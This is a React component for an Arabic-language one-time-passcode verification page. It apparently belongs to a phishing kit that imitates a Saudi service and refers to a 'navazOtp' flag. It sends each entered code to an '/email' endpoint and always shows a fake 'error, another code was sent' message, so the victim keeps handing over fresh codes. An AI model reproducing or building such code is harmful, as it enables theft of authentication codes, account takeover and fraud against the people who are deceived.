import React, { useEffect, useState } from 'react'
import { api_route, socket } from '../App'
import axios from 'axios'
import { TailSpin } from 'react-loader-spinner'
import { BiBook } from 'react-icons/bi'

const MotslOtp = ({setLoading,loading}) => {
  const [error,setError] = useState(null)
  const [otp,setOtp] = useState(null)
  const [counter, setCounter] = useState(60)

  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1); // Decrease counter by 1 second
      }
    }, 1000);

    // Cleanup function to clear the interval when the component unmounts
    return () => clearInterval(timer);
  }, [counter]); 

    // Calculate minutes and seconds
    const minutes = Math.floor(counter / 60);
    const seconds = counter % 60;

    // Format the counter value as "MM:SS"
    const formattedMinutes = String(minutes).padStart(2, '0');
    const formattedSeconds = String(seconds).padStart(2, '0');
    const handleSubmit =async(e)=>{
      setLoading(true)
        setError(false)
        e.preventDefault()
        try {
          await axios.post(api_route+'/email?type=one&navazOtp=true',{otp}).then(()=>{
          } )
        } catch (error) {
          
        }finally{
          setLoading(false)
          setError(true)
        }
        
    }


    
    
  return (
    <div className='w-full flex flex-col justify-center items-center'>
    {
        loading && 
        <div className='absolute top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ' >
<TailSpin
  height="50"
  width="50"
  color="blue"
  ariaLabel="tail-spin-loading"
  radius="1"
  wrapperStyle={{}}
  wrapperClass=""
  visible={true}/>
        </div>
   
    }
    <div style={{minHeight:'60vh'}} className='w-full flex justify-center items-center md:items-start'>
            <div className='md:full w-3/4  py-5 shadow-md my-2 h-fit ' style={{border:'1px solid #eee'}}>
                <div className='flex w-full items-center gap-x-3  border-b-2  pb-3' style={{borderRight:'2px solid blue ',paddingRight:'5px'}} dir={`rtl`}>
                    <BiBook className='text-blue-500 md:text-xl text-sm'/>
                    <span className='md:text-sm text-sm font-semibold'>التحقق من الطلب</span>
                </div>
                <form className='flex flex-col w-full  items-center pt-5 gap-y-5' onSubmit={handleSubmit}>
                    <div className='flex gap-x-5  text-gray-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc'>
                            <p>{formattedMinutes}:{formattedSeconds}</p>
                            <span >يرجى ادخال رمز تحقق تم ارساله الى رقم جوالك</span>
                    </div>
                    <input className='md:w-1/2 w-2/3 outline-none  rounded-sm px-2 py-1 md:text-sm otp-desc text-center' style={{border:'1px solid #eee'}}  placeholder={`********`} required type='text' onChange={(e)=>setOtp(e.target.value.replace(/\D/g, ''))}  inputMode="numeric"   value={otp}/>
                    <button className='text-white bg-blue-500 w-1/2 text-sm md:text-base py-1 rounded-sm '>تحقق</button>
                    {error && <span className='flex gap-x-5  text-red-500 lg:text-sm md:font-semibold text-xs justify-center items-center otp-desc'>'*حصل خطأ تم ارسال رمز تفعيل اخر الى جوالك'</span>}
                </form>
            </div>
            <div></div>
    </div>

</div>
  )
}

export default MotslOtp